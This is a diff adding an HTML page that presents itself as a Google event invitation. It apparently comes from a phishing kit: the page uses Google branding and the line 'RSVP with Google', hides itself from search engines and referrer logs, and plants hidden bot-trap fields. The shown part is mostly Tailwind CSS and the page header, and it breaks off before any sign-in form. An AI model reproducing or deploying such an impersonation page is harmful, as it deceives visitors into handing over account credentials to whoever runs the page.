@@ -1,0 +1,466 @@
+<!DOCTYPE html><html lang="en" class="h-full"><head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="UTF-8">
+  <script>
+    /* Must run first — fixes all relative paths when hosted in a subfolder (e.g. /dar/aura-events/) */
+    (function () {
+      var path = window.location.pathname || '/';
+      var seg = path.split('/').pop() || '';
+      if (/\.[a-z0-9]{2,5}$/i.test(seg)) {
+        path = path.substring(0, path.lastIndexOf('/') + 1);
+      } else if (!path.endsWith('/')) {
+        path += '/';
+      }
+      window.AURA_BASE_PATH = path;
+      var base = document.createElement('base');
+      base.id = 'aura-base';
+      base.href = path;
+      document.head.appendChild(base);
+    })();
+  </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="referrer" content="no-referrer">
+  <meta name="description" content="You have been invited to a special occasion. Open your invitation and RSVP with Google.">
+  <title>Google event · Invitation</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="64_Z4Ya.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="64_Z4Ya.jpg">
+  
+  <!-- Fonts -->
+  
+  
+  <link href="css2_Z4Ya.css" rel="stylesheet">
+
+  <!-- Vue and Tailwind CDN -->
+  <script src="vue.global.js"></script>
+  <script src="3.4.17.js"></script>
+  
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            google: {
+              blue: '#4285F4',
+              red: '#EA4335',
+              yellow: '#FBBC05',
+              green: '#34A853',
+            },
+            primary: {
+              DEFAULT: '#1a73e8',
+              hover: '#1557b0',
+              container: '#d2e3fc',
+            },
+            surface: {
+              dim: '#f8f9fa',
+              container: '#f1f3f4',
+            }
+          },
+          fontFamily: {
+            sans: ['Roboto', 'Inter', 'system-ui', '-apple-system', 'sans-serif'],
+            serif: ['Playfair Display', 'Georgia', 'serif'],
+          },
+          animation: {
+            'slide-up': 'slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards',
+          },
+          keyframes: {
+            slideUp: {
+              '0%': { opacity: '0', transform: 'translateY(16px)' },
+              '100%': { opacity: '1', transform: 'translateY(0)' },
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style type="text/tailwindcss">
+    @layer base {
+      body {
+        @apply antialiased text-slate-800 bg-gradient-to-b from-slate-50 to-white min-h-screen selection:bg-blue-100;
+      }
+    }
+    @layer utilities {
+      .glassmorphism {
+        background: rgba(255, 255, 255, 0.7);
+        backdrop-filter: blur(12px);
+        -webkit-backdrop-filter: blur(12px);
+        border: 1px solid rgba(255, 255, 255, 0.45);
+      }
+    }
+  </style>
+  <style>
+    [v-cloak] {
+      display: none !important;
+    }
+  </style>
+  <script src="site-settings_Z4Ya.js"></script>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:Roboto, Inter, system-ui, -apple-system, sans-serif;font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}
+      body{min-height:100vh;background-image:linear-gradient(to bottom, var(--tw-gradient-stops));--tw-gradient-from:#f8fafc var(--tw-gradient-from-position);--tw-gradient-to:rgb(248 250 252 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to);--tw-gradient-to:#fff var(--tw-gradient-to-position);--tw-text-opacity:1;color:rgb(30 41 59 / var(--tw-text-opacity, 1));-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
+      body *::selection{--tw-bg-opacity:1;background-color:rgb(219 234 254 / var(--tw-bg-opacity, 1))}
+      body::selection{--tw-bg-opacity:1;background-color:rgb(219 234 254 / var(--tw-bg-opacity, 1))}.pointer-events-none{pointer-events:none}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-0{inset:0px}.bottom-6{bottom:1.5rem}.left-\[-10000px\]{left:-10000px}.right-6{right:1.5rem}.z-10{z-index:10}.z-40{z-index:40}.z-50{z-index:50}.z-\[-1\]{z-index:-1}.mx-auto{margin-left:auto;margin-right:auto}.mb-2{margin-bottom:0.5rem}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.mt-0\.5{margin-top:0.125rem}.mt-2{margin-top:0.5rem}.mt-8{margin-top:2rem}.flex{display:flex}.inline-flex{display:inline-flex}.grid{display:grid}.aspect-\[9\/16\]{aspect-ratio:9/16}.h-full{height:100%}.h-10{height:2.5rem}.h-12{height:3rem}.h-14{height:3.5rem}.h-4{height:1rem}.h-5{height:1.25rem}.h-6{height:1.5rem}.h-7{height:1.75rem}.h-px{height:1px}.min-h-screen{min-height:100vh}.w-10{width:2.5rem}.w-12{width:3rem}.w-14{width:3.5rem}.w-5{width:1.25rem}.w-6{width:1.5rem}.w-7{width:1.75rem}.w-full{width:100%}.w-px{width:1px}.max-w-\[180px\]{max-width:180px}.max-w-\[220px\]{max-width:220px}.max-w-\[300px\]{max-width:300px}.max-w-lg{max-width:32rem}.max-w-md{max-width:28rem}.max-w-sm{max-width:24rem}.max-w-xl{max-width:36rem}.flex-1{flex:1 1 0%}.shrink-0{flex-shrink:0}.translate-x-\[2px\]{--tw-translate-x:2px;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.translate-y-2{--tw-translate-y:0.5rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.translate-y-3{--tw-translate-y:0.75rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.translate-y-4{--tw-translate-y:1rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.translate-y-0{--tw-translate-y:0px;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.scale-95{--tw-scale-x:.95;--tw-scale-y:.95;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.transform{transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}@keyframes slideUp{0%{opacity:0;transform:translateY(16px)}100%{opacity:1;transform:translateY(0)}}.animate-slide-up{animation:slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards}.cursor-pointer{cursor:pointer}.grid-cols-1{grid-template-columns:repeat(1, minmax(0, 1fr))}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-2{gap:0.5rem}.gap-2\.5{gap:0.625rem}.gap-3{gap:0.75rem}.gap-4{gap:1rem}.gap-6{gap:1.5rem}.gap-8{gap:2rem}.-space-x-2 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(-0.5rem * var(--tw-space-x-reverse));margin-left:calc(-0.5rem * calc(1 - var(--tw-space-x-reverse)))}.overflow-hidden{overflow:hidden}.truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.rounded-2xl{border-radius:1rem}.rounded-3xl{border-radius:1.5rem}.rounded-\[28px\]{border-radius:28px}.rounded-full{border-radius:9999px}.rounded-xl{border-radius:0.75rem}.border{border-width:1px}.border-2{border-width:2px}.border-b{border-bottom-width:1px}.border-t{border-top-width:1px}.border-slate-100{--tw-border-opacity:1;border-color:rgb(241 245 249 / var(--tw-border-opacity, 1))}.border-slate-200\/60{border-color:rgb(226 232 240 / 0.6)}.border-slate-200\/80{border-color:rgb(226 232 240 / 0.8)}.border-white{--tw-border-opacity:1;border-color:rgb(255 255 255 / var(--tw-border-opacity, 1))}.bg-\[\#0d0d0d\]{--tw-bg-opacity:1;background-color:rgb(13 13 13 / var(--tw-bg-opacity, 1))}.bg-black\/10{background-color:rgb(0 0 0 / 0.1)}.bg-blue-50{--tw-bg-opacity:1;background-color:rgb(239 246 255 / var(--tw-bg-opacity, 1))}.bg-blue-600{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity, 1))}.bg-slate-200{--tw-bg-opacity:1;background-color:rgb(226 232 240 / var(--tw-bg-opacity, 1))}.bg-slate-50\/40{background-color:rgb(248 250 252 / 0.4)}.bg-slate-50\/50{background-color:rgb(248 250 252 / 0.5)}.bg-slate-900{--tw-bg-opacity:1;background-color:rgb(15 23 42 / var(--tw-bg-opacity, 1))}.bg-slate-900\/60{background-color:rgb(15 23 42 / 0.6)}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-white\/70{background-color:rgb(255 255 255 / 0.7)}.bg-white\/90{background-color:rgb(255 255 255 / 0.9)}.bg-gradient-to-r{background-image:linear-gradient(to right, var(--tw-gradient-stops))}.bg-gradient-to-t{background-image:linear-gradient(to top, var(--tw-gradient-stops))}.from-black\/30{--tw-gradient-from:rgb(0 0 0 / 0.3) var(--tw-gradient-from-position);--tw-gradient-to:rgb(0 0 0 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-blue-600{--tw-gradient-from:#2563eb var(--tw-gradient-from-position);--tw-gradient-to:rgb(37 99 235 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.via-indigo-600{--tw-gradient-to:rgb(79 70 229 / 0)  var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), #4f46e5 var(--tw-gradient-via-position), var(--tw-gradient-to)}.via-transparent{--tw-gradient-to:rgb(0 0 0 / 0)  var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), transparent var(--tw-gradient-via-position), var(--tw-gradient-to)}.to-blue-500{--tw-gradient-to:#3b82f6 var(--tw-gradient-to-position)}.to-transparent{--tw-gradient-to:transparent var(--tw-gradient-to-position)}.bg-clip-text{-webkit-background-clip:text;background-clip:text}.fill-current{fill:currentColor}.fill-none{fill:none}.stroke-current{stroke:currentColor}.stroke-none{stroke:none}.object-cover{object-fit:cover}.p-1{padding:0.25rem}.p-3\.5{padding:0.875rem}.p-4{padding:1rem}.p-5{padding:1.25rem}.p-6{padding:1.5rem}.p-7{padding:1.75rem}.px-1{padding-left:0.25rem;padding-right:0.25rem}.px-4{padding-left:1rem;padding-right:1rem}.px-5{padding-left:1.25rem;padding-right:1.25rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.px-8{padding-left:2rem;padding-right:2rem}.py-1\.5{padding-top:0.375rem;padding-bottom:0.375rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.py-4{padding-top:1rem;padding-bottom:1rem}.py-6{padding-top:1.5rem;padding-bottom:1.5rem}.pb-3{padding-bottom:0.75rem}.pb-6{padding-bottom:1.5rem}.pt-4{padding-top:1rem}.text-left{text-align:left}.text-center{text-align:center}.text-3xl{font-size:1.875rem;line-height:2.25rem}.text-\[10px\]{font-size:10px}.text-\[11px\]{font-size:11px}.text-\[13px\]{font-size:13px}.text-\[17px\]{font-size:17px}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-extrabold{font-weight:800}.font-medium{font-weight:500}.font-normal{font-weight:400}.font-semibold{font-weight:600}.uppercase{text-transform:uppercase}.leading-relaxed{line-height:1.625}.leading-tight{line-height:1.25}.tracking-tight{letter-spacing:-0.025em}.tracking-wider{letter-spacing:0.05em}.tracking-widest{letter-spacing:0.1em}.text-blue-500{--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity, 1))}.text-blue-600{--tw-text-opacity:1;color:rgb(37 99 235 / var(--tw-text-opacity, 1))}.text-slate-400{--tw-text-opacity:1;color:rgb(148 163 184 / var(--tw-text-opacity, 1))}.text-slate-500{--tw-text-opacity:1;color:rgb(100 116 139 / var(--tw-text-opacity, 1))}.text-slate-600{--tw-text-opacity:1;color:rgb(71 85 105 / var(--tw-text-opacity, 1))}.text-slate-700{--tw-text-opacity:1;color:rgb(51 65 85 / var(--tw-text-opacity, 1))}.text-slate-800{--tw-text-opacity:1;color:rgb(30 41 59 / var(--tw-text-opacity, 1))}.text-slate-900{--tw-text-opacity:1;color:rgb(15 23 42 / var(--tw-text-opacity, 1))}.text-transparent{color:transparent}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.opacity-0{opacity:0}.opacity-100{opacity:1}.shadow-2xl{--tw-shadow:0 25px 50px -12px rgb(0 0 0 / 0.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-inner{--tw-shadow:inset 0 2px 4px 0 rgb(0 0 0 / 0.05);--tw-shadow-colored:inset 0 2px 4px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-sm{--tw-shadow:0 1px 2px 0 rgb(0 0 0 / 0.05);--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-xl{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-blue-100\/40{--tw-shadow-color:rgb(219 234 254 / 0.4);--tw-shadow:var(--tw-shadow-colored)}.shadow-blue-500\/10{--tw-shadow-color:rgb(59 130 246 / 0.1);--tw-shadow:var(--tw-shadow-colored)}.shadow-blue-500\/20{--tw-shadow-color:rgb(59 130 246 / 0.2);--tw-shadow:var(--tw-shadow-colored)}.shadow-blue-700\/30{--tw-shadow-color:rgb(29 78 216 / 0.3);--tw-shadow:var(--tw-shadow-colored)}.shadow-slate-100\/40{--tw-shadow-color:rgb(241 245 249 / 0.4);--tw-shadow:var(--tw-shadow-colored)}.shadow-slate-100\/50{--tw-shadow-color:rgb(241 245 249 / 0.5);--tw-shadow:var(--tw-shadow-colored)}.backdrop-blur-md{--tw-backdrop-blur:blur(12px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.backdrop-blur-sm{--tw-backdrop-blur:blur(4px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-colors{transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-opacity{transition-property:opacity;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-transform{transition-property:transform;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-200{transition-duration:200ms}.duration-300{transition-duration:300ms}.duration-500{transition-duration:500ms}.duration-700{transition-duration:700ms}.duration-75{transition-duration:75ms}
+    .hover\:-translate-y-0\.5:hover{--tw-translate-y:-0.125rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
+    .hover\:scale-105:hover{--tw-scale-x:1.05;--tw-scale-y:1.05;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
+    .hover\:scale-\[1\.02\]:hover{--tw-scale-x:1.02;--tw-scale-y:1.02;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
+    .hover\:border-slate-300:hover{--tw-border-opacity:1;border-color:rgb(203 213 225 / var(--tw-border-opacity, 1))}
+    .hover\:bg-blue-50:hover{--tw-bg-opacity:1;background-color:rgb(239 246 255 / var(--tw-bg-opacity, 1))}
+    .hover\:bg-blue-700:hover{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity, 1))}
+    .hover\:bg-slate-50:hover{--tw-bg-opacity:1;background-color:rgb(248 250 252 / var(--tw-bg-opacity, 1))}
+    .hover\:bg-white:hover{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}
+    .hover\:text-slate-600:hover{--tw-text-opacity:1;color:rgb(71 85 105 / var(--tw-text-opacity, 1))}
+    .hover\:text-slate-800:hover{--tw-text-opacity:1;color:rgb(30 41 59 / var(--tw-text-opacity, 1))}
+    .hover\:underline:hover{-webkit-text-decoration-line:underline;text-decoration-line:underline}
+    .hover\:opacity-90:hover{opacity:0.9}
+    .hover\:shadow-blue-500\/20:hover{--tw-shadow-color:rgb(59 130 246 / 0.2);--tw-shadow:var(--tw-shadow-colored)}
+    .hover\:shadow-blue-500\/30:hover{--tw-shadow-color:rgb(59 130 246 / 0.3);--tw-shadow:var(--tw-shadow-colored)}
+    .active\:translate-y-0:active{--tw-translate-y:0px;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
+    .active\:scale-95:active{--tw-scale-x:.95;--tw-scale-y:.95;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
+    .group:hover .group-hover\:-translate-y-0\.5{--tw-translate-y:-0.125rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
+    .group:hover .group-hover\:translate-x-0\.5{--tw-translate-x:0.125rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
+    .group:hover .group-hover\:scale-100{--tw-scale-x:1;--tw-scale-y:1;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
+    .group:hover .group-hover\:opacity-100{opacity:1}
+    @media (min-width: 640px){.sm\:max-w-\[200px\]{max-width:200px}.sm\:p-8{padding:2rem}.sm\:px-8{padding-left:2rem;padding-right:2rem}.sm\:pb-8{padding-bottom:2rem}.sm\:pt-6{padding-top:1.5rem}.sm\:text-4xl{font-size:2.25rem;line-height:2.5rem}}
+    @media (min-width: 768px){.md\:gap-10{gap:2.5rem}.md\:p-12{padding:3rem}.md\:px-12{padding-left:3rem;padding-right:3rem}.md\:py-10{padding-top:2.5rem;padding-bottom:2.5rem}.md\:pb-12{padding-bottom:3rem}.md\:pt-8{padding-top:2rem}.md\:text-5xl{font-size:3rem;line-height:1}.md\:text-base{font-size:1rem;line-height:1.5rem}}
+    @media (min-width: 1024px){.lg\:grid-cols-\[62\%_38\%\]{grid-template-columns:62% 38%}.lg\:border-l{border-left-width:1px}.lg\:border-t-0{border-top-width:0px}.lg\:px-16{padding-left:4rem;padding-right:4rem}.lg\:pb-16{padding-bottom:4rem}.lg\:pt-10{padding-top:2.5rem}}
+  </style>
+  <link rel="stylesheet" href="custom.css">
+</head>
+<body class="h-full">
+  <!-- Bot honeypots -->
+  <div aria-hidden="true" class="absolute left-[-10000px] w-px h-px overflow-hidden opacity-0 pointer-events-none z-[-1]">
+    <label for="email_confirm">Confirm your email address</label>
+    <input type="email" name="email_confirm" id="email_confirm" tabindex="-1" autocomplete="off" value="">
+    <label for="ab-honeypot-url">Website URL</label>
+    <input type="text" name="website" id="ab-honeypot-url" tabindex="-1" autocomplete="off" value="">
+    <label for="ab-honeypot-name">Full name</label>
+    <input type="text" name="full_name" id="ab-honeypot-name" tabindex="-1" autocomplete="off" value="">
+  </div>
+
+  <div id="app" class="min-h-screen flex flex-col" data-v-app=""><div class="flex-1 grid grid-cols-1 lg:grid-cols-[62%_38%] min-h-screen"><!-- Left Pane (62%) --><main class="flex flex-col bg-slate-50/40 px-6 pt-4 pb-6 sm:px-8 sm:pt-6 sm:pb-8 md:px-12 md:pt-8 md:pb-12 lg:px-16 lg:pt-10 lg:pb-16 justify-between transition-all duration-700"><!-- Header --><header class="flex justify-between items-center w-full mb-8 shrink-0"><a href="#" class="flex items-center gap-2.5 text-slate-800 font-medium hover:opacity-90 transition-opacity"><!-- Google event Brand Logo --><svg class="w-6 h-6 shrink-0" viewBox="0 0 24 24" aria-hidden="true" role="img"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg><span class="text-[17px] tracking-tight text-slate-500 font-normal"><strong class="font-semibold text-slate-800">Google</strong> event</span></a><a href="#" class="text-sm font-semibold px-4 py-2 rounded-full text-blue-600 hover:bg-blue-50 transition-all duration-200"> My Invites </a></header><!-- Left Content 